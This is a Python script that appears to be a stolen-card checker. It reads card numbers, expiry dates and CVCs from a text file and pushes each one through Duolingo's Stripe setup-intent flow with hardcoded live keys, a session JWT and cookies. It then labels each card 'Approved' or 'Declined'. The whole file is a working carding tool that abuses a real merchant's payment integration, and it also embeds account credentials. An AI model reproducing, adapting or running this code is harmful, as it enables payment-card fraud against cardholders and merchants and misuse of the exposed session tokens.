import requests
import time

file = open('modi.txt', 'r')
m = '\033[1;31m'
c = '\033[2;32m'


start_num = 0
for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    mm = P.split('|')[1]
    yy = P.split('|')[2][-2:]
    cvc = P.split('|')[3].replace('\n', '')
    P = P.replace('\n', '')

    
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&billing_details[address][postal_code]=10080&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2Fc26d673896%3B+stripe-js-v3%2Fc26d673896%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.duolingo.com&time_on_page=76354&guid=496c0f79-4fa8-47da-9209-df1bdac366c2&muid=30428f69-00e0-4c80-a971-420474c837c5&sid=ab5d62e7-b7b8-47fb-800e-2f968bb22b3f&key=pk_live_wGV2ziRFq7KJLNaVUAJgrzDf'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    id = (response.json()['id'])

    cookies = {
    'wuuid': 'b4c724eb-1b42-401e-8b50-924d9f34f5d6',
    'lu': 'https://www.duolingo.com/',
    'initial_referrer': 'https://www.google.com/',
    'lp': 'splash',
    '_gcl_au': '1.1.383948799.1697048697',
    '_fbp': 'fb.1.1697048700100.417803673',
    '_gid': 'GA1.2.325891564.1697048701',
    'lr': '',
    'csrf_token': 'IjU3NWRkMGUwNmVlNTRmZThiMTEwMDBmZGNlZmUwZGVkIg==',
    'logged_out_uuid': '1281260888',
    'logged_in': 'true',
    'lang': 'ar',
    'g_state': '{"i_l":0}',
    'jwt_token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjoxMjgxMjYwODg4fQ.MKrdKXX1Jxh5fpkny7MjninROORur538ZTQn8IhxjbU',
    'tsl': '1697048984025',
    'OptanonConsent': 'isGpcEnabled=0&datestamp=Wed+Oct+11+2023+21%3A30%3A00+GMT%2B0300+(Arabian+Standard+Time)&version=6.16.0&isIABGlobal=false&consentId=bee49238-c5b6-458c-9e3b-8f5842336650&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&hosts=H3%3A1%2CH14%3A1%2CH11%3A1%2CH1%3A1%2CH15%3A1%2CH6%3A1%2CH22%3A1%2CH2%3A1%2CH26%3A1%2CH7%3A1%2CH16%3A1%2CH9%3A1%2CH28%3A1%2CH18%3A1%2CH10%3A1%2CH12%3A1%2CH13%3A1&AwaitingReconsent=false',
    '_ga_CSFDVCPQ4F': 'GS1.1.1697048702.1.1.1697049005.60.0.0',
    '_ga': 'GA1.2.819129825.1697048701',
    'AWSALB': 'xxEmT1SK4g21SxQ52sTnB8B9xV/vXDHp/ACSWbyoUQtY5P+3nmY2mysOsXpWmKqfvADr60e+LsfTYptamUTN8dR8XdXEDX0IrLmr37drDkvXQGDvy/BFQD0w4uUw',
    'AWSALBCORS': 'xxEmT1SK4g21SxQ52sTnB8B9xV/vXDHp/ACSWbyoUQtY5P+3nmY2mysOsXpWmKqfvADr60e+LsfTYptamUTN8dR8XdXEDX0IrLmr37drDkvXQGDvy/BFQD0w4uUw',
    }

    headers = {
    'authority': 'www.duolingo.com',
    'accept': 'application/json; charset=UTF-8',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjoxMjgxMjYwODg4fQ.MKrdKXX1Jxh5fpkny7MjninROORur538ZTQn8IhxjbU',
    'content-type': 'application/json; charset=UTF-8',
    # 'cookie': 'wuuid=b4c724eb-1b42-401e-8b50-924d9f34f5d6; lu=https://www.duolingo.com/; initial_referrer=https://www.google.com/; lp=splash; _gcl_au=1.1.383948799.1697048697; _fbp=fb.1.1697048700100.417803673; _gid=GA1.2.325891564.1697048701; lr=; csrf_token=IjU3NWRkMGUwNmVlNTRmZThiMTEwMDBmZGNlZmUwZGVkIg==; logged_out_uuid=1281260888; logged_in=true; lang=ar; g_state={"i_l":0}; jwt_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjoxMjgxMjYwODg4fQ.MKrdKXX1Jxh5fpkny7MjninROORur538ZTQn8IhxjbU; tsl=1697048984025; OptanonConsent=isGpcEnabled=0&datestamp=Wed+Oct+11+2023+21%3A30%3A00+GMT%2B0300+(Arabian+Standard+Time)&version=6.16.0&isIABGlobal=false&consentId=bee49238-c5b6-458c-9e3b-8f5842336650&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&hosts=H3%3A1%2CH14%3A1%2CH11%3A1%2CH1%3A1%2CH15%3A1%2CH6%3A1%2CH22%3A1%2CH2%3A1%2CH26%3A1%2CH7%3A1%2CH16%3A1%2CH9%3A1%2CH28%3A1%2CH18%3A1%2CH10%3A1%2CH12%3A1%2CH13%3A1&AwaitingReconsent=false; _ga_CSFDVCPQ4F=GS1.1.1697048702.1.1.1697049005.60.0.0; _ga=GA1.2.819129825.1697048701; AWSALB=xxEmT1SK4g21SxQ52sTnB8B9xV/vXDHp/ACSWbyoUQtY5P+3nmY2mysOsXpWmKqfvADr60e+LsfTYptamUTN8dR8XdXEDX0IrLmr37drDkvXQGDvy/BFQD0w4uUw; AWSALBCORS=xxEmT1SK4g21SxQ52sTnB8B9xV/vXDHp/ACSWbyoUQtY5P+3nmY2mysOsXpWmKqfvADr60e+LsfTYptamUTN8dR8XdXEDX0IrLmr37drDkvXQGDvy/BFQD0w4uUw',
    'idempotency-key': id,
    'origin': 'https://www.duolingo.com',
    'referer': 'https://www.duolingo.com/shop',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-amzn-trace-id': 'User=1281260888',
    'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
    'paymentMethodId': id,
    'product': 'DUOLINGO',
    }

    response = requests.post(
    'https://www.duolingo.com/2017-06-30/users/1281260888/create-setup',
    cookies=cookies,
    headers=headers,
    json=json_data,
    )
    clientSecret = (response.json()['clientSecret'])

    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    data = {
    'return_url': 'https://www.duolingo.com/shop',
    'payment_method': id,
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_wGV2ziRFq7KJLNaVUAJgrzDf',
    'client_secret': clientSecret,
    }

    ids = clientSecret.split('_secret_')[0]
    response = requests.post(f'https://api.stripe.com/v1/setup_intents/{ids}/confirm',
                             headers=headers,
                             data=data,
                             )
    ii = (response.text)

    if 'error' in ii:
        print(m + f'[ {start_num} ]', P, '\ncondition➜ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\nRequired balance➜ 1$\nBY @MODI')
    else:
        print(c + f'[ {start_num} ]', P, '\ncondition➜ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  ✅\nRequired balance➜ 1$\nBY @MODI')
    
